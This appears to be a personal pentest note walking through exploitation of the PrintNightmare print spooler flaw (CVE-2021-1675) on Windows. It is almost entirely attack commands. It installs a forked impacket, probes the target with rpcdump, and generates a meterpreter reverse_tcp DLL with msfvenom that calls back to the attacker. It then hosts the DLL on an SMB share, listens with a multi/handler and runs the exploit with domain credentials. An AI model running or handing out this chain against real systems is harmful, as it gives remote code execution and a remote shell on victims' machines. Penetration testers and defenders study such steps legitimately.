for this exploit to work, we need specific version of impacket
```JavaScript
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
  
check if the machine is vulnerable to PrintNightmare using rpcdump.py
```JavaScript
rpcdump.py @<IP> | egrep 'MS-RPRN|MS-PAR'
```
![[../../assets/PrintNightmare/image 367.png|image 367.png]]
  
create a DLL payload with msfvenom
```JavaScript
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f dll > backupscript.dll
```
![[../../assets/PrintNightmare/image 1 275.png|image 1 275.png]]
  
host the payload in an SMB share
```JavaScript
smbserver.py -smb2support <share_name> /path/to/backupscript.dll
```
![[../../assets/PrintNightmare/image 2 234.png|image 2 234.png]]
  
Start up metasploit with exploit/multi/handler
![[../../assets/PrintNightmare/image 3 202.png|image 3 202.png]]
  
Run teh exploit
```JavaScript
python3 CVE-2021-1675.py <DOMAIN>/<user>:<pass>@<IP> '\\<your_IP>\<share_name>\backupscript.dll'
```
![[../../assets/PrintNightmare/image 4 177.png|image 4 177.png]]
![[../../assets/PrintNightmare/image 5 165.png|image 5 165.png]]